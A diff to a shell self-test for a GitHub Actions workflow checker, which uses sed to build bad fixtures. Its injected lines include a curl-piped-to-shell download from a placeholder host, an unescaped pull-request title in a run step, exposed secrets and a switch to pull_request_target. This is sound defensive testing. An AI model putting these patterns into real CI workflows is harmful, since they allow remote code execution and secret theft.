@@ -209,6 +209,7 @@ jobs:
           TITLE: ${{ github.event.pull_request.title }}
         run: |
           echo "$TITLE"
+          echo ok
       - name: Local
         uses: ./.github/actions/local
 EOF
@@ -230,8 +231,8 @@ EOF
   sed -i '/persist-credentials: false/d' "$work/bad3/workflows/bad.yaml"
   sed -i 's|^  push:|  pull_request_target:|' "$work/bad4/workflows/bad.yaml"
   sed -i "s|HAS_TOKEN: \${{ secrets.TOKEN != '' }}|TOKEN: \${{ secrets.TOKEN }}|" "$work/bad5/workflows/bad.yaml"
-  sed -i 's|echo "$TITLE"|echo "${{ github.event.pull_request.title }}"|' "$work/bad6/workflows/bad.yaml"
-  sed -i 's|echo "$TITLE"|curl -fsSL https://example.invalid/install.sh \| sh|' "$work/bad7/workflows/bad.yaml"
+  sed -i "s|echo ok|echo \"\${{ github.event.pull_request.title }}\"|" "$work/bad6/workflows/bad.yaml"
+  sed -i 's|echo ok|curl -fsSL https://example.invalid/install.sh \| sh|' "$work/bad7/workflows/bad.yaml"
 
   if bash "${BASH_SOURCE[0]}" "$work/good" >/dev/null 2>&1; then
     echo "PASS  the good fixture passes"
